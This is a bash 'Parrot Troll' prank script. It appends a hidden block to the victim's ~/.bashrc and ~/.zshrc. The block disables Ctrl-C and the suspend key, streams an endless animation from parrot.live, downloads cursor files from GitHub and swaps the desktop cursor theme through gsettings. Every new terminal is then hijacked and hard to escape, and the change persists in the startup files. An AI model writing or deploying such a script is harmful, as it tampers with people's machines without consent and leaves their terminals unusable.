#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
mkdir -p ~/.icons/parrot-cursor/
cd ~/.icons/parrot-cursor
wget -q https://raw.githubusercontent.com/PedroZappa/parrot.troll/main/parrot-cursor/index.theme -O index.theme
mkdir -p cursors && cd cursors
wget -q https://github.com/PedroZappa/parrot.troll/raw/main/parrot-cursor/cursors/pointer -O default
wget -q https://github.com/PedroZappa/parrot.troll/raw/main/parrot-cursor/cursors/pointer -O pointer
gsettings set org.gnome.desktop.interface cursor-theme 'parrot-cursor'
gsettings set org.gnome.desktop.interface cursor-size 32
cd
EOF
)

append_parrot_troll() {
    local file="$1"
    if [ -f "$file" ]; then
		echo "$PARROT_TROLL" >> "$file"
		echo "Parrot Troll 🦜 added to $file"
    fi
}

append_parrot_troll ~/.bashrc
append_parrot_troll ~/.zshrc
source ~/.zshrc
